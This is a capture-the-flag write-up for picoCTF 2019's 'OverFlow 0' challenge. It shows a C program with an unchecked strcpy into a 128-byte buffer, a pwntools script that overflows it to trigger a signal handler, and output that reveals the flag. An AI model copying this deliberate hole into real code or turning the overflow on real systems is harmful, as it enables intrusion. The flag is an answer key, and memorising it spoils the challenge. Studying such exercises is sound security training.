# OverFlow 0
Binary Exploitation, 100 points

## Description:
> This should be easy. Overflow the correct buffer in this program and get a flag.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```


## Solution:


This challenge is similar to last year's [buffer overflow 0](/2018_picoCTF/buffer%20overflow%200.md). If we pass an argument longer than 128 bytes, we will overflow the local buffer in `vuln`. If the argument is long enough, we will cause a segmentation fault and trigger the `sigsegv_handler`, printing the flag.


```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/overflow-0_3_e217dae547cccbfeb9dbae42623404b7/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start(argv = [cyclic(200)])
flag = io.recvline()
log.success(flag)
```

Output:
```console
root@kali:/media/sf_CTFs/pico/OverFlow_0# python exploit.py
[*] '/media/sf_CTFs/pico/OverFlow_0/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.lSY6SM2udh'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/overflow-0_3_e217dae547cccbfeb9dbae42623404b7'
[+] Starting remote process '/problems/overflow-0_3_e217dae547cccbfeb9dbae42623404b7/vuln' on 2019shell1.picoctf.com: pid 1788162
[+] picoCTF{3asY_P3a5y40407786}
```